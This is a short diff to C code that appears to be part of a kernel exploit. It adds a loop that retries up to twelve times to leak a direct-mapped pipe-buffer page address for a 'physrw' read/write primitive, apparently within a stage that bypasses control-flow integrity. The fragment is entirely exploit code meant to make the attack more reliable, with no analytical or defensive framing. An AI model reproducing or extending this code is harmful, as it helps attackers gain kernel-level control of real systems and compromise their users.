@@ -494,9 +494,24 @@ int try_cfi_stage(void) {
 #endif
 
 #if defined(APP_FOPS_BEFORE_PIPE) && APP_FOPS_BEFORE_PIPE
-  pipebuf_page_base = prepare_pipe_buffer_page();
-  pr_info("fresh physrw pipe after verified fops page=%016zx\n",
-          pipebuf_page_base);
+#ifndef PIPE_FIRST_LEAK_ATTEMPTS
+#define PIPE_FIRST_LEAK_ATTEMPTS 12
+#endif
+  for (int first_leak_attempt = 0;
+       first_leak_attempt < PIPE_FIRST_LEAK_ATTEMPTS;
+       first_leak_attempt++) {
+    if (first_leak_attempt != 0) {
+      reset_pipe_attempt();
+    }
+    pipebuf_page_base = prepare_pipe_buffer_page();
+    pr_info("fresh physrw pipe after verified fops page=%016zx "
+            "attempt=%d/%d\n",
+            pipebuf_page_base, first_leak_attempt + 1,
+            PIPE_FIRST_LEAK_ATTEMPTS);
+    if (is_direct_ptr(pipebuf_page_base)) {
+      break;
+    }
+  }
   if (!is_direct_ptr(pipebuf_page_base)) {
     cfi_last_step = 8;
     cfi_last_errno = errno;
